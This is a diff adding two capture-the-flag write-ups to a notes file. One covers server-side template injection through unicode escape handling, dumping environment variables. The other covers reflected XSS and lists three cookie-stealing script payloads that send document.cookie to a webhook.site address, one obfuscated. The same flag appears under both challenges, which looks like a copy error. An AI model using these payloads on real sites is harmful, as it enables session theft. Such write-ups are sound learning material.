@@ -77,6 +77,52 @@ learned about sql injection using partial id validation and union based query ma
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
 
 
+# Sweethaven
+### challenge asks us to exploit the servers unicode escape handling to turn a review into an ssti that gives the flag
+
+
+## My Solve
+i logged in by clicking register here and just entering any random credentials. this took me to a review submission page. after checking the app.py code i noticed that the server decodes escape sequences using bytes(review "utf-8").decode("unicode_escape"). because of that i replaced the normal dollar sign with \N{DOLLAR SIGN} and tested an injection like \N{DOLLAR SIGN}{7*7}. it evaluated the expression and added 49 as the review so i knew ssti was possible. then i used a known ssti payload ${cycler.init.globals.os.environ} but again replaced the dollar sign with \N{DOLLAR SIGN}. this gave me useful environment info. after that i repeated the same trick on the actual challenge site and got the flag.
+**Flag:** nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
+
+
+
+## What I Learned
+Learnt about server side template injection
+
+## References
+None
+
+
+# Why its not called css
+### The challenge asks us to perform reflected xss on a series of pages to steal cookies from the bot and use them to access protected parts of the site.
+
+
+## My Solve
+**Flag:** nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
+first i read up a bit on what xss actually is and understood that its about injecting malicious code into a websites input or link so that an attacker can steal sensitive info when a victim opens it.
+
+i used the web panel from the challenge which gives payloads for stealing cookies from the bot. i pasted the given payload into xss me 1 and submitted it. the bot visited my payload url and i received a cookie value like c=xss2=/bf2a73106a3aa48bab9b8b47e4bd350e. i took the end part of that value and appended it to the challenge sites url which unlocked the next stage.
+
+in xss me 2 i repeated the same process with the next payload and got another cookie c=xss3=/3e79c8a64bd10f5fa897b7832384f043. again i added the last part to the challenge url to move forward.
+
+in xss me 3 i entered the final payload and completed the chain to finish the challenge.
+
+```
+<script>window.location='https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
+<script>window.location='	https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
+<body onload="window.location='//webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+window['doc'+'ument']['coo'+'kie']">
+
+```
+
+## What I Learned
+XSS Exploitation 
+
+## References
+None
+
+
+
 
 
 
